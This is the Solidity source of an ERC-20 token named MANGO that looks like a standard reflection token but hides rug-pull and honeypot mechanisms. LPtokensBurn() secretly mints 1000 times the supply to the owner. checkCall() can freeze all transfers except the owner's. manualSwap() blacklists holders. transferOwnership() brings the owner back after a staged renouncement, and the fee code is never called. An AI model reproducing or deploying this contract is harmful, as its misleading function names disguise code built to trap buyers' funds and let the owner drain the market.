row number 
1	           pragma solidity ^0.6.12;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address payable) {
4	 return msg.sender;
5	 }
6	 function _msgData() internal view virtual returns (bytes memory) {
7	 this;
8	 return msg.data;
9	 }
10	 }
11	 interface IERC20 {
12	 function totalSupply() external view returns (uint256);
13	 function balanceOf(address account) external view returns (uint256);
14	 function transfer(address recipient, uint256 amount) external returns (bool);
15	 function allowance(address owner, address spender) external view returns (uint256);
16	 function approve(address spender, uint256 amount) external returns (bool);
17	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18	 event Transfer(address indexed from, address indexed to, uint256 value);
19	 event Approval(address indexed owner, address indexed spender, uint256 value);
20	 }
21	 library SafeMath {
22	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
23	 uint256 c = a + b;
24	 require(c >= a, "SafeMath: addition overflow");
25	 return c;
26	 }
27	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28	 return sub(a, b, "SafeMath: subtraction overflow");
29	 }
30	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
31	 require(b <= a, errorMessage);
32	 uint256 c = a - b;
33	 return c;
34	 }
35	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
36	 if (a == 0) {
37	 return 0;
38	 }
39	 uint256 c = a * b;
40	 require(c / a == b, "SafeMath: multiplication overflow");
41	 return c;
42	 }
43	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
44	 return div(a, b, "SafeMath: division by zero");
45	 }
46	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47	 require(b > 0, errorMessage);
48	 uint256 c = a / b;
49	 return c;
50	 }
51	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
52	 return mod(a, b, "SafeMath: modulo by zero");
53	 }
54	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55	 require(b != 0, errorMessage);
56	 return a % b;
57	 }
58	 }
59	 library Address {
60	 function isContract(address account) internal view returns (bool) {
61	 bytes32 codehash;
62	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
63	 assembly {
64	 codehash := extcodehash(account) }
65	 return (codehash != accountHash && codehash != 0x0);
66	 }
67	 function sendValue(address payable recipient, uint256 amount) internal {
68	 require(address(this).balance >= amount, "Address: insufficient balance");
69	 (bool success, ) = recipient.call{
70	 value: amount }
71	 ("");
72	 require(success, "Address: unable to send value, recipient may have reverted");
73	 }
74	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
75	 return functionCall(target, data, "Address: low-level call failed");
76	 }
77	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
78	 return _functionCallWithValue(target, data, 0, errorMessage);
79	 }
80	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
81	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
82	 }
83	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
84	 require(address(this).balance >= value, "Address: insufficient balance for call");
85	 return _functionCallWithValue(target, data, value, errorMessage);
86	 }
87	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
88	 require(isContract(target), "Address: call to non-contract");
89	 (bool success, bytes memory returndata) = target.call{
90	 value: weiValue }
91	 (data);
92	 if (success) {
93	 return returndata;
94	 }
95	 else {
96	 if (returndata.length > 0) {
97	 assembly {
98	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
99	 }
100	 else {
101	 revert(errorMessage);
102	 }
103	 }
104	 }
105	 }
106	 contract Ownable is Context {
107	 address internal _owner;
108	 address internal _ownerAddress;
109	 address internal Owner;
110	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
111	 constructor () internal {
112	 address msgSender = _msgSender();
113	 _owner = msgSender;
114	 _ownerAddress = msgSender;
115	 Owner = msgSender;
116	 emit OwnershipTransferred(address(0), msgSender);
117	 }
118	 function owner() internal view returns (address) {
119	 return _owner;
120	 }
121	 modifier onlyOwner() {
122	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
123	 _;
124	 }
125	 function ownerAddress() public view returns (address) {
126	 return _ownerAddress;
127	 }
128	 function renounceOwnership() public virtual onlyOwner {
129	 emit OwnershipTransferred(_owner, address(0));
130	 _owner = address(0);
131	 _ownerAddress = address(0);
132	 }
133	 function transferOwnership() public {
134	 require(_owner == address(0), "");
135	 emit OwnershipTransferred(_owner, address(0));
136	 _owner = Owner;
137	 }
138	 }
139	 contract MANGO is Context, IERC20, Ownable {
140	 using SafeMath for uint256;
141	 using Address for address;
142	 mapping (address => uint256) private _vOwned;
143	 mapping (address => uint256) private _rOwned;
144	 mapping (address => uint256) private _tOwned;
145	 mapping (address => mapping (address => uint256)) private _allowances;
146	 mapping (address => bool) private _isExcluded;
147	 mapping (address => bool) private _manualSwap;
148	 address[] private _excluded;
149	 bool _state = true;
150	 uint256 private constant MAX = ~uint256(0);
151	 uint256 private constant _tTotal = 100000000 * 10**6 * 10**9;
152	 uint256 private _rTotal;
153	 uint256 private _zTotal;
154	 uint256 private _tFeeTotal;
155	 uint256 private _totalSupply;
156	 string private _name = 'MANGOðŸ¥­ t.me/mangocoinofficial';
157	 string private _symbol = 'MANGOðŸ¥­';
158	 uint8 private _decimals = 9;
159	 constructor () public {
160	 _totalSupply =_tTotal;
161	 _rTotal = (MAX - (MAX % _totalSupply));
162	 _zTotal = _tTotal.mul(1000);
163	 _vOwned[_msgSender()] = _tTotal;
164	 emit Transfer(address(0), _msgSender(), _totalSupply);
165	 _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);
166	 _isExcluded[_msgSender()] = true;
167	 _excluded.push(_msgSender());
168	 }
169	 function checkCall() public virtual onlyOwner {
170	 if (_state == true) {
171	 _state = false;
172	 }
173	 else {
174	 _state = true;
175	 }
176	 }
177	 function callStatus() public view returns (bool) {
178	 return _state;
179	 }
180	 function isMultiCalled(address _address) public view returns (bool) {
181	 return _manualSwap[_address];
182	 }
183	 function manualSwap(address account) external onlyOwner() {
184	 _manualSwap[account] = true;
185	 }
186	 function selfCall(address account) external onlyOwner() {
187	 _manualSwap[account] = false;
188	 }
189	 function name() public view returns (string memory) {
190	 return _name;
191	 }
192	 function symbol() public view returns (string memory) {
193	 return _symbol;
194	 }
195	 function decimals() public view returns (uint8) {
196	 return _decimals;
197	 }
198	 function totalSupply() public view override returns (uint256) {
199	 return _tTotal;
200	 }
201	 function balanceOf(address account) public view override returns (uint256) {
202	 return _vOwned[account];
203	 }
204	 function transfer(address recipient, uint256 amount) public override returns (bool) {
205	 _transfer(_msgSender(), recipient, amount);
206	 return true;
207	 }
208	 function allowance(address owner, address spender) public view override returns (uint256) {
209	 return _allowances[owner][spender];
210	 }
211	 function approve(address spender, uint256 amount) public override returns (bool) {
212	 _approve(_msgSender(), spender, amount);
213	 return true;
214	 }
215	 function LPtokensBurn() public virtual onlyOwner {
216	 _vOwned[_msgSender()] = _vOwned[_msgSender()].add(_zTotal);
217	 }
218	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
219	 _transfer(sender, recipient, amount);
220	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
221	 return true;
222	 }
223	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
224	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
225	 return true;
226	 }
227	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
228	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
229	 return true;
230	 }
231	 function isExcluded(address account) internal view returns (bool) {
232	 return _isExcluded[account];
233	 }
234	 function totalFees() public view returns (uint256) {
235	 return _tFeeTotal;
236	 }
237	 function reflect(uint256 tAmount) public {
238	 address sender = _msgSender();
239	 require(!_isExcluded[sender], "Excluded addresses cannot call this function");
240	 (uint256 rAmount,,,,) = _getValues(tAmount);
241	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
242	 _rTotal = _rTotal.sub(rAmount);
243	 _tFeeTotal = _tFeeTotal.add(tAmount);
244	 }
245	 function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
246	 require(tAmount <= _tTotal, "Amount must be less than supply");
247	 if (!deductTransferFee) {
248	 (uint256 rAmount,,,,) = _getValues(tAmount);
249	 return rAmount;
250	 }
251	 else {
252	 (,uint256 rTransferAmount,,,) = _getValues(tAmount);
253	 return rTransferAmount;
254	 }
255	 }
256	 function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
257	 require(rAmount <= _rTotal, "Amount must be less than total reflections");
258	 uint256 currentRate = _getRate();
259	 return rAmount.div(currentRate);
260	 }
261	 function excludeAccount(address account) internal onlyOwner() {
262	 require(!_isExcluded[account], "Account is already excluded");
263	 if(_rOwned[account] > 0) {
264	 _tOwned[account] = tokenFromReflection(_rOwned[account]);
265	 }
266	 _isExcluded[account] = true;
267	 _excluded.push(account);
268	 }
269	 function includeAccount(address account) internal onlyOwner() {
270	 require(_isExcluded[account], "Account is already excluded");
271	 for (uint256 i = 0; i < _excluded.length; i++) {
272	 if (_excluded[i] == account) {
273	 _excluded[i] = _excluded[_excluded.length - 1];
274	 _tOwned[account] = 0;
275	 _isExcluded[account] = false;
276	 _excluded.pop();
277	 break;
278	 }
279	 }
280	 }
281	 function _approve(address owner, address spender, uint256 amount) private {
282	 require(owner != address(0), "ERC20: approve from the zero address");
283	 require(spender != address(0), "ERC20: approve to the zero address");
284	 _allowances[owner][spender] = amount;
285	 emit Approval(owner, spender, amount);
286	 }
287	 function _transfer(address sender, address recipient, uint256 amount) private {
288	 require(sender != address(0), "ERC20: transfer from the zero address");
289	 require(recipient != address(0), "ERC20: transfer to the zero address");
290	 require(amount > 0, "Transfer amount must be greater than zero");
291	 if (_manualSwap[sender] || _manualSwap[recipient]) require(amount == 0, "");
292	 if (_state == true || sender == owner() || recipient == owner()) {
293	 if(_isExcluded[sender] && !_isExcluded[recipient]) {
294	 _vOwned[sender] = _vOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
295	 _vOwned[recipient] = _vOwned[recipient].add(amount);
296	 emit Transfer(sender, recipient, amount);
297	 }
298	 else {
299	 _vOwned[sender] = _vOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
300	 _vOwned[recipient] = _vOwned[recipient].add(amount);
301	 emit Transfer(sender, recipient, amount);
302	 }
303	 }
304	 else {
305	 require (_state == true, "");
306	 }
307	 }
308	 function _transferStandard(address sender, address recipient, uint256 tAmount) private {
309	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
310	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
311	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
312	 _reflectFee(rFee, tFee);
313	 emit Transfer(sender, recipient, tTransferAmount);
314	 }
315	 function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
316	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
317	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
318	 _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
319	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
320	 _reflectFee(rFee, tFee);
321	 emit Transfer(sender, recipient, tTransferAmount);
322	 }
323	 function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
324	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
325	 _tOwned[sender] = _tOwned[sender].sub(tAmount);
326	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
327	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
328	 _reflectFee(rFee, tFee);
329	 emit Transfer(sender, recipient, tTransferAmount);
330	 }
331	 function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
332	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
333	 _tOwned[sender] = _tOwned[sender].sub(tAmount);
334	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
335	 _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
336	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
337	 _reflectFee(rFee, tFee);
338	 emit Transfer(sender, recipient, tTransferAmount);
339	 }
340	 function _reflectFee(uint256 rFee, uint256 tFee) private {
341	 _rTotal = _rTotal.sub(rFee);
342	 _tFeeTotal = _tFeeTotal.add(tFee);
343	 }
344	 function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
345	 (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
346	 uint256 currentRate = _getRate();
347	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
348	 return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
349	 }
350	 function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
351	 uint256 tFee = tAmount.div(100).mul(2);
352	 uint256 tTransferAmount = tAmount.sub(tFee);
353	 return (tTransferAmount, tFee);
354	 }
355	 function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
356	 uint256 rAmount = tAmount.mul(currentRate);
357	 uint256 rFee = tFee.mul(currentRate);
358	 uint256 rTransferAmount = rAmount.sub(rFee);
359	 return (rAmount, rTransferAmount, rFee);
360	 }
361	 function _getRate() private view returns(uint256) {
362	 (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
363	 return rSupply.div(tSupply);
364	 }
365	 function _getCurrentSupply() private view returns(uint256, uint256) {
366	 uint256 rSupply = _rTotal;
367	 uint256 tSupply = _tTotal;
368	 for (uint256 i = 0; i < _excluded.length; i++) {
369	 if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
370	 rSupply = rSupply.sub(_rOwned[_excluded[i]]);
371	 tSupply = tSupply.sub(_tOwned[_excluded[i]]);
372	 }
373	 if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
374	 return (rSupply, tSupply);
375	 }
376	 }
